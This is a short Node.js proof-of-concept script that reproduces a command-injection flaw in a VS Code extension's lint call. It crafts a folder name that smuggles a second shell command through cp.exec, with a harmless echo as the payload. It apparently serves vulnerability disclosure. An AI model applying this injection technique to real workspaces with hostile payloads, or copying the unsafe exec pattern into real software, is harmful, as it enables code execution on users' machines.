// Reproduces vscode/src/extension.js:178-183 (lintDocument) exactly:
//   const command = `"${compiler}" lint "${target}"`;
//   cp.exec(command, {cwd, windowsHide:true}, ...)
// `target` comes from resolveProjectPath(document) -> a filesystem path the
// workspace controls. cp.exec runs it through a shell, so shell metacharacters
// in a folder name are interpreted.
const cp = require("child_process");
const fs = require("fs");
const path = require("path");

const base = __dirname;
const evil = path.join(base, 'proj" & echo INJECTED-COMMAND-RAN & rem ');
try { fs.mkdirSync(path.join(base, "proj"), { recursive: true }); } catch (e) {}

const compiler = "abstract";
const target = evil;                       // <- attacker-controlled path text
const command = `"${compiler}" lint "${target}"`;   // extension.js:181
console.log("constructed command:", command);

cp.exec(command, { cwd: base, windowsHide: true }, (error, stdout, stderr) => {
  console.log("--- stdout ---");
  console.log(stdout);
  console.log("--- stderr ---");
  console.log(stderr);
});
